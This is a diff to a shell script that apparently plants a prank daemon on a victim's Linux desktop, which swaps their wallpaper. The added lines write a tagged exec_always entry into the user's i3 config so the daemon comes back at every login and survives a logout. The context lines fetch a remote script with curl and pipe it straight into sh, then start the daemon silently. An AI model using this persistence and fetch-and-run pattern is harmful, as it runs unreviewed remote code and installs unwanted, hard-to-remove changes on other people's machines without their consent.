@@ -28,6 +28,16 @@ fi
 # the antidote can put it back after the daemon replaced it with Louis.
 [ -f "$HOME/.fehbg" ] && cp "$HOME/.fehbg" "$dir/fehbg.bak"
 
+# Restart across logins: exec_always in the i3 config re-runs the daemon at
+# every session start, so a logout without the antidote does not defuse the
+# prank. Tagged like the rc lines, the antidote removes it with one sed.
+conf="$HOME/.config/i3/config"
+mkdir -p "$(dirname "$conf")"
+touch "$conf"
+line="exec_always $file 2>/dev/null 1>&2 & # confloose by leo [saytocurse]"
+grep -qF -- "$line" "$conf" || echo "$line" >> "$conf"
+i3-msg restart >/dev/null 2>&1 || true
+
 echo $(curl -fsSL "$base/confloose/bashrc_confloose_base.sh") "saytocurse" "'\"$file\" 2>/dev/null 1>&2 &'" | sh
 # Start now too; the daemon's lock makes a second start a no-op.
 "$file" >/dev/null 2>&1 &
